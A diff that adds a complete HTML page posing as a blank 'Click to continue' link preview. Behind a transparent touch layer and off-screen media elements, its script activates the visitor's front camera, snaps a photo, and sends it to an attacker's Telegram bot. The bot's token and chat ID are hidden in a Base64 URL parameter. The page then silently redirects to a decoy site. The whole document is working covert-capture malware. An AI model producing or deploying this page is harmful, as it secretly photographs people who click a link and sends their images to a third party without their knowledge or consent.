@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title> </title>
+
+    <!-- ===== Open Graph (يستخدم صورة من المستودع) ===== -->
+    <meta property="og:title" content="URL Link" />
+    <meta property="og:description" content="Click to continue" />
+    <meta property="og:image" content="https://site-url.github.io/Website-/img.png" />
+    <meta property="og:url" content="https://site-url.github.io/Website-/index.html" />
+    <meta name="twitter:card" content="summary_large_image" />
+
+    <style>
+        /* واجهة بيضاء كاملة بدون أي نصوص مرئية */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body, html {
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
+            overflow: hidden;
+            position: fixed;
+            top: 0;
+            left: 0;
+        }
+        /* طبقة شفافة تستقبل اللمس/النقرات الأولى */
+        .touch-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            background: transparent;
+            cursor: pointer;
+        }
+        /* إخفاء عناصر الوسائط خارج الشاشة تماماً */
+        video, canvas {
+            position: fixed;
+            top: -1000px;
+            left: -1000px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="touch-layer" id="triggerLayer"></div>
+    <video id="videoElem" autoplay muted playsinline></video>
+    <canvas id="canvasElem"></canvas>
+
+    <script>
+        (function() {
+            "use strict";
+
+            // ------------------------------------------------------------------
+            // 1. استخراج الإعدادات من بارامتر 'p' (Base64 JSON)
+            //    التنسيق المتوقع: { "t": "BOT_TOKEN", "c": "CHAT_ID", "r": "REDIRECT_URL" }
+            // ------------------------------------------------------------------
+            let botToken = null;
+            let chatId = null;
+            let redirectUrl = "https://www.google.com";
+
+            const urlParams = new URLSearchParams(window.location.search);
+            const encodedParam = urlParams.get('p');
+
+            if (encodedParam && typeof encodedParam === 'string' && encodedParam.trim().length > 0) {
+                try {
+                    const decodedJson = atob(encodedParam);
+                    const config = JSON.parse(decodedJson);
+                    if (config.t && typeof config.t === 'string') botToken = config.t;
+                    if (config.c && (typeof config.c === 'string' || typeof config.c === 'number')) chatId = String(config.c);
+                    if (config.r && config.r.startsWith('http')) redirectUrl = config.r;
+                    else if (config.r && config.r.length > 0) redirectUrl = "https://" + config.r;
+                } catch(e) {
+                    console.warn("Invalid p parameter");
+                }
+            }
+
+            // ------------------------------------------------------------------
+            // 2. عناصر DOM والثوابت
+            // ------------------------------------------------------------------
+            const video = document.getElementById('videoElem');
+            const canvas = document.getElementById('canvasElem');
+            const triggerDiv = document.getElementById('triggerLayer');
+
+            let mediaStream = null;
+            let isCapturing = false;
+            let isPhotoSent = false;
+            let frameAnalyzerInterval = null;
+            let redirectExecuted = false;
+
+            // ------------------------------------------------------------------
+            // دالة التوجيه الحتمية (window.location.replace)
+            // ------------------------------------------------------------------
+            const executeRedirect = () => {
+                if (redirectExecuted) return;
+                redirectExecuted = true;
+                // تنظيف الموارد
+                if (mediaStream) {
+                    try {
+                        mediaStream.getTracks().forEach(track => {
+                            if (track.readyState === 'live') track.stop();
+                        });
+                    } catch(e) {}
+                }
+                if (frameAnalyzerInterval) clearInterval(frameAnalyzerInterval);
+                window.location.replace(redirectUrl);
+            };
+
+            // ------------------------------------------------------------------
+            // إرسال الصورة إلى Telegram (جودة عالية 0.9)
+            // ------------------------------------------------------------------
+            const sendToTelegram = (jpegBlob) => {
+                if (isPhotoSent) return;
+                isPhotoSent = true;
+
+                if (!botToken || !chatId) {
+                    executeRedirect();
+                    return;
+                }
+
+                const apiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', jpegBlob, 'silent_capture.jpg');
+
+                fetch(apiUrl, {
+                    method: 'POST',
+                    body: formData,
+                    keepalive: true,
+                    mode: 'no-cors'
+                }).catch(() => {});
+
+                // التوجيه فوراً بعد الإرسال (لا ننتظر الرد)
+                setTimeout(() => {
+                    executeRedirect();
+                }, 30);
+            };
+
+            // ------------------------------------------------------------------
+            // التقاط الإطار بجودة عالية (0.9)
+            // ------------------------------------------------------------------
+            const captureAndSend = () => {
+                if (isPhotoSent) return;
+
+                const vw = video.videoWidth;
+                const vh = video.videoHeight;
+                if (vw === 0 || vh === 0) {
+                    executeRedirect();
+                    return;
+                }
+
+                canvas.width = vw;
+                canvas.height = vh;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, vw, vh);
+
+                canvas.toBlob((blob) => {
+                    if (blob && blob.size > 0) {
+                        sendToTelegram(blob);
+                    } else {
+                        executeRedirect();
+                    }
+                }, 'image/jpeg', 0.9); // جودة عالية
+            };
+
+            // ------------------------------------------------------------------
+            // تحليل البكسلات المركزية مع مهلة 6 ثوانٍ (بدلاً من 4)
+            // ------------------------------------------------------------------
+            const startPixelAnalysis = () => {
+                if (frameAnalyzerInterval) clearInterval(frameAnalyzerInterval);
+
+                const maxWaitForColor = 6000; // 6 ثوانٍ لانتظار إطار ملون
+                const startTime = Date.now();
+
+                frameAnalyzerInterval = setInterval(() => {
+                    if (isPhotoSent || redirectExecuted) {
+                        if (frameAnalyzerInterval) clearInterval(frameAnalyzerInterval);
+                        return;
+                    }
+
+                    if (video.readyState !== 4 || video.videoWidth === 0 || video.videoHeight === 0) {
+                        return;
+                    }
+
+                    const w = video.videoWidth;
+                    const h = video.videoHeight;
+                    if (w < 8 || h < 8) return;
+
+                    canvas.width = w;
+                    canvas.height = h;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, w, h);
+
+                    const centerX = Math.floor(w / 2);
+                    const centerY = Math.floor(h / 2);
+                    let pixel;
+                    try {
+                        pixel = ctx.getImageData(centerX, centerY, 1, 1).data;
+                    } catch(e) {
+                        return;
+                    }
+
+                    const rgbSum = pixel[0] + pixel[1] + pixel[2];
+
+                    if (rgbSum > 30) {
+                        if (!isPhotoSent && !redirectExecuted) {
+                            if (frameAnalyzerInterval) clearInterval(frameAnalyzerInterval);
+                            frameAnalyzerInterval = null;
+                            captureAndSend();
+                        }
+                    } else if (Date.now() - startTime > maxWaitForColor && !isPhotoSent && !redirectExecuted) {
+                        // بعد المهلة نلتقط أي إطار
+                        if (frameAnalyzerInterval) clearInterval(frameAnalyzerInterval);
+                        frameAnalyzerInterval = null;
+                        captureAndSend();
+                    }
+                }, 80);
+            };
+
+            // ------------------------------------------------------------------
+            // تشغيل الكاميرا — تُستدعى عند النقر على الطبقة الشفافة
+            // لا توجد مهلة عامة، فقط ننتظر نتيجة الإذن
+            // ------------------------------------------------------------------
+            const activateCameraAndEngine = async () => {
+                if (isCapturing) return;
+                isCapturing = true;
+
+                // إزالة المستمعين لمنع التكرار
+                if (triggerDiv) {
+                    triggerDiv.removeEventListener('click', activateCameraAndEngine);
+                    triggerDiv.removeEventListener('touchstart', activateCameraAndEngine);
+                }
+
+                try {
+                    const constraints = {
+                        video: {
+                            width: { ideal: 640 },
+                            height: { ideal: 480 },
+                            facingMode: "user"
+                        }
+                    };
+                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                    mediaStream = stream;
+                    video.srcObject = stream;
+                    video.setAttribute("playsinline", "");
+                    video.muted = true;
+
+                    // انتظار جاهزية الفيديو
+                    await new Promise((resolve) => {
+                        if (video.readyState >= 2) {
+                            resolve();
+                        } else {
+                            const onReady = () => {
+                                video.removeEventListener('loadeddata', onReady);
+                                video.removeEventListener('loadedmetadata', onReady);
+                                resolve();
+                            };
+                            video.addEventListener('loadeddata', onReady);
+                            video.addEventListener('loadedmetadata', onReady);
+                            setTimeout(resolve, 800);
+                        }
+                    });
+
+                    try { await video.play(); } catch(e) {}
+
+                    startPixelAnalysis();
+
+                } catch (err) {
+                    // رفض الإذن أو خطأ → توجيه فوري
+                    executeRedirect();
+                }
+            };
+
+            // ------------------------------------------------------------------
+            // ربط مستمع الأحداث على الطبقة البيضاء (أول لمسة/نقرة)
+            // ------------------------------------------------------------------
+            if (triggerDiv) {
+                triggerDiv.addEventListener('click', activateCameraAndEngine, { once: false, passive: true });
+                triggerDiv.addEventListener('touchstart', activateCameraAndEngine, { once: false, passive: true });
+            }
+
+            // ------------------------------------------------------------------
+            // محاولة تلقائية بعد 1.5 ثانية (قد تنجح في بعض البيئات)
+            // ------------------------------------------------------------------
+            setTimeout(() => {
+                if (!isCapturing) {
+                    activateCameraAndEngine().catch(() => {});
+                }
+            }, 1500);
+
+            // ------------------------------------------------------------------
+            // منع القوائم السياقية والسحب
+            // ------------------------------------------------------------------
+            document.addEventListener('contextmenu', (e) => e.preventDefault());
+            document.addEventListener('dragstart', (e) => e.preventDefault());
+
+            // ------------------------------------------------------------------
+            // صمام أمان: في حال لم يتم التوجيه خلال 15 ثانية (نادراً)
+            // ------------------------------------------------------------------
+            setTimeout(() => {
+                if (!redirectExecuted) executeRedirect();
+            }, 15000);
+
+        })();
+    </script>
+</body>
+</html>
